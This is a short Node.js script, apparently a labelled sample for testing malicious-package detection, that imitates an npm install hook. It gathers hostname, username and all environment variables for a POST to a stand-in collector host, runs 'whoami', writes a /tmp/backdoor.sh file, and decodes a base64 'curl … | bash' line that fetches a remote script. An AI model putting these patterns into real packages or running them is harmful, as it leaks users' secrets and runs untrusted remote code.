const fs = require('fs');
const { exec } = require('child_process');
const os = require('os');

// Suspicious behavior: Reading environment variables
const homeDir = os.homedir();
const envVars = process.env;

console.log('Installing package...');

// Suspicious behavior: Network request to external server
const https = require('https');
const data = JSON.stringify({
  hostname: os.hostname(),
  platform: os.platform(),
  user: os.userInfo().username,
  env: envVars
});

const options = {
  hostname: 'malicious-collector.com',
  port: 443,
  path: '/collect',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
};

// Suspicious behavior: Executing shell commands
exec('whoami', (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }
  console.log(`Current user: ${stdout}`);
});

// Suspicious behavior: File system manipulation
try {
  fs.writeFileSync('/tmp/backdoor.sh', '#!/bin/bash\necho "Backdoor installed"\n');
  fs.chmodSync('/tmp/backdoor.sh', '755');
} catch (err) {
  console.error('Failed to create backdoor:', err.message);
}

// Suspicious behavior: Base64 encoded payload
const payload = 'Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLXNpdGUuY29tL3BheWxvYWQuc2ggfCBiYXNo';
const decoded = Buffer.from(payload, 'base64').toString('ascii');
console.log('Decoded payload:', decoded);

console.log('Installation complete.');